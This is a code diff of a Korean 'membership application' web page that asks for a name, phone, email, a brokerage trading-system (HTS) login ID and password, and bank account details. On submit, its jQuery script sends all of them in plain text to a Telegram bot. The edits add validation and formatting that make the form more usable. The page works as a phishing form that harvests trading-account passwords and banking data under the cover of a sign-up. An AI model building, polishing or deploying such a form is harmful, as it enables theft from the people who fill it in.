@@ -3,153 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>베스트업 멤버십 신청</title>
+    <title>멤버십 신청</title>
     <!-- jQuery CDN -->
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <!-- Noto Sans Font CDN -->
+    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Noto Sans KR', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f5f5f5;
+            background: #f5f5f5;
         }
-        
         .container {
             max-width: 800px;
             margin: 20px auto;
+            background: #fff;
             padding: 20px;
-            background-color: #ffffff;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
             border-radius: 8px;
         }
-
-        h1 {
+        .header {
             text-align: center;
-            color: #333;
-            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
         }
-
-        form {
+        .form-group {
             display: flex;
             flex-direction: column;
+            margin: 10px 0;
         }
-
-        label {
-            margin-top: 10px;
+        .form-group label {
+            padding: 10px;
             font-weight: bold;
         }
-
-        input[type="text"],
-        input[type="password"],
-        input[type="email"],
-        input[type="tel"] {
+        .form-group input {
             padding: 10px;
-            margin-top: 5px;
+            margin: 5px 0;
             border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 16px;
         }
-
         button {
-            margin-top: 20px;
-            padding: 15px;
+            width: 100%;
+            padding: 10px;
             background-color: #007BFF;
             color: white;
             border: none;
             border-radius: 4px;
-            font-size: 16px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            margin-top: 20px;
         }
-
         button:hover {
             background-color: #0056b3;
         }
-
-        @media (max-width: 600px) {
-            .container {
-                margin: 10px;
-                padding: 15px;
+        @media (min-width: 768px) {
+            .form-group {
+                flex-direction: row;
             }
-
-            h1 {
-                font-size: 24px;
-            }
-
-            input[type="text"],
-            input[type="password"],
-            input[type="email"],
-            input[type="tel"] {
-                font-size: 14px;
-            }
-
-            button {
-                font-size: 14px;
+            .form-group label, .form-group input {
+                flex: 1;
             }
         }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <h1>멤버십 신청 111</h1>
+        <div class="header">
+            <h1>멤버십 신청</h1>
+            <p>멤버십 신청 정보를 입력해 주세요.</p>
+        </div>
         <form id="membershipForm">
-            <label for="name">이름</label>
-            <input type="text" id="name" name="name" required>
-
-            <label for="phone">휴대폰 번호</label>
-            <input type="tel" id="phone" name="phone" pattern="[0-9]{10,11}" required>
-
-            <label for="htsId">HTS 아이디</label>
-            <input type="text" id="htsId" name="htsId" required>
-
-            <label for="htsPassword">HTS 패스워드</label>
-            <input type="password" id="htsPassword" name="htsPassword" required>
-
-            <label for="email">이메일</label>
-            <input type="email" id="email" name="email" required>
-
-            <label for="referrer">추천인</label>
-            <input type="text" id="referrer" name="referrer">
-
-            <label for="bank">은행명</label>
-            <input type="text" id="bank" name="bank" required>
-
-            <label for="accountHolder">예금주</label>
-            <input type="text" id="accountHolder" name="accountHolder" required>
-
-            <label for="accountNumber">계좌번호</label>
-            <input type="text" id="accountNumber" name="accountNumber" required>
-
+            <div class="form-group">
+                <label for="name">이름</label>
+                <input type="text" id="name" name="name" required pattern="[가-힣a-zA-Z0-9]{2,5}">
+            </div>
+            <div class="form-group">
+                <label for="phone">휴대폰 번호</label>
+                <input type="tel" id="phone" name="phone" required pattern="\\d{3}-\\d{3,4}-\\d{4}">
+            </div>
+            <div class="form-group">
+                <label for="htsId">HTS 아이디</label>
+                <input type="text" id="htsId" name="htsId" required pattern="[a-zA-Z0-9]+">
+            </div>
+            <div class="form-group">
+                <label for="htsPassword">HTS 비밀번호</label>
+                <input type="password" id="htsPassword" name="htsPassword" required pattern="[a-zA-Z0-9!@#$%^&*]+">
+            </div>
+            <div class="form-group">
+                <label for="email">이메일</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="referrer">추천인</label>
+                <input type="text" id="referrer" name="referrer">
+            </div>
+            <div class="form-group">
+                <label for="bank">은행명</label>
+                <input type="text" id="bank" name="bank" required pattern="[가-힣]{1,10}">
+            </div>
+            <div class="form-group">
+                <label for="accountHolder">예금주</label>
+                <input type="text" id="accountHolder" name="accountHolder" required pattern="[가-힣a-zA-Z0-9]{2,5}">
+            </div>
+            <div class="form-group">
+                <label for="accountNumber">계좌번호</label>
+                <input type="text" id="accountNumber" name="accountNumber" required pattern="\\d+">
+            </div>
             <button type="submit">멤버십 신청</button>
         </form>
     </div>
 
     <script>
-        $(document).ready(function(){
-            $("#membershipForm").submit(function(event){
+        $(document).ready(function() {
+            $('#phone').on('input', function() {
+                var number = $(this).val().replace(/[^\d]/g, '');
+                $(this).val(number.replace(/(\d{3})(\d{3,4})(\d{4})/, '$1-$2-$3'));
+            });
+
+            $('#membershipForm').submit(function(event) {
                 event.preventDefault();
-                
+                var valid = this.checkValidity();
+                if (!valid) {
+                    alert('모든 필드를 올바르게 입력하세요.');
+                    return;
+                }
+
                 const data = {
-                    name: $("#name").val(),
-                    phone: $("#phone").val(),
-                    htsId: $("#htsId").val(),
-                    htsPassword: $("#htsPassword").val(),
-                    email: $("#email").val(),
-                    referrer: $("#referrer").val(),
-                    bank: $("#bank").val(),
-                    accountHolder: $("#accountHolder").val(),
-                    accountNumber: $("#accountNumber").val()
+                    name: $('#name').val(),
+                    phone: $('#phone').val(),
+                    htsId: $('#htsId').val(),
+                    htsPassword: $('#htsPassword').val(),
+                    email: $('#email').val(),
+                    referrer: $('#referrer').val(),
+                    bank: $('#bank').val(),
+                    accountHolder: $('#accountHolder').val(),
+                    accountNumber: $('#accountNumber').val()
                 };
 
+                // Email validation
+                if (!/\S+@\S+\.\S+/.test(data.email)) {
+                    alert('이메일 주소를 정확히 입력하세요.');
+                    return;
+                }
+
                 const message = `
-                    멤버십 신청\n
+                    멤버십 신청 정보:\n
                     이름: ${data.name}\n
                     휴대폰 번호: ${data.phone}\n
                     HTS 아이디: ${data.htsId}\n
-                    HTS 패스워드: ${data.htsPassword}\n
+                    HTS 비밀번호: ${data.htsPassword}\n
                     이메일: ${data.email}\n
                     추천인: ${data.referrer}\n
                     은행명: ${data.bank}\n
@@ -157,7 +158,7 @@
                     계좌번호: ${data.accountNumber}
                 `;
 
-                // Telegram Bot API 전송
+                // Replace 'YOUR_TELEGRAM_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual Telegram Bot Token and Chat ID
                 const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
                 const chatId = 'YOUR_CHAT_ID';
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -171,8 +172,9 @@
                     },
                     success: function(response) {
                         alert("신청이 성공적으로 접수되었습니다!");
+                        $('form')[0].reset(); // Reset form fields after successful submission
                     },
-                    error: function(error) {
+                    error: function(xhr, status, error) {
                         console.error("Error sending message: ", error);
                         alert("신청을 처리하는 중 문제가 발생했습니다. 다시 시도해 주세요.");
                     }
